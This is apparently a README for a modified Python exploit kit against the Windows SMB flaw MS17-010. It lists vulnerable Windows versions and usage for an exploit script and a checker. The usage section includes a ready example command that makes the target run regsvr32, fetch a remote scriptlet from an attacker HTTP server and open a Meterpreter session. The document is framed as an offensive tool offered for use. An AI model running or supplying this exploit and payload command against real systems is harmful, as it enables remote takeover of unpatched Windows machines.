MS17-010: Python
=================

All credit goes to Worawit: 

[Worawit Wang: GitHub](https://github.com/worawit/MS17-010/)

[Worawit Wang: Twitter](https://twitter.com/sleepya_/)

Worawit Wang released a collection of Python exploits for MS17-010. These tools worked far more reliably than the Metasploit modules but didn't have much of a payload besides writing a pwned.txt to the C:/. However, Worawit Wang did add functionality for creating a service. 

Korey McKinley wrote an [article](https://lmgsecurity.com/manually-exploiting-ms17-010/) utilising that function to create a service which used regsvr32 to call back to Meterpreter and create a full Meterpreter connection. I'd never seen that path to exploitation, so I thought I'd modify zzz_exploit.py with Korey's logic and make the script more dynamic and user friendly. 

However, the module Korey used in that blog article was not available in my version of Metasploit. It is now called **web_delivery**. 

There are two pieces, `zzz_checker.py` and `zzz_exploit.py`. Both self-explanatory.

***

Exploit Usage
=============

```
usage: zzz_exploit.py [-h] [-u] [-p] -t  -c  [-P] [--version]

Tested versions:
1 Windows 2016 x64
2 Windows 10 Pro Vuild 10240 x64
3 Windows 2012 R2 x64
4 Windows 8.1 x64
5 Windows 2008 R2 SP1 x64
6 Windows 7 SP1 x64
7 Windows 2008 SP1 x64
8 Windows 2003 R2 SP2 x64
9 Windows XP SP2 x64
10  Windows 8.1 x86
11  Windows 7 SP1 x86
12  Windows 2008 SP1 x86
13  Windows 2003 SP2 x86
14  Windows XP SP3 x86
15  Windows 2000 SP4 x86

optional arguments:
  -h, --help        show this help message and exit
  -u , --user       username to authenticate with
  -p , --password   password for specified user
  -t , --target     Target for exploitation
  -c , --command    Command to add to service
  -P , --pipe       Pipe to connect to
  --version         show program's version number and exit

Example: python zzz_exploit -t 192.168.0.1 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
```

Checker Usage
=============

```
usage: zzz_checker.py [-h] -t  [-c]

MS17-010 Checker

optional arguments:
  -h, --help           show this help message and exit
  -t , --targets       Target(s) to attack
  -c , --credentials   Credentials to use
```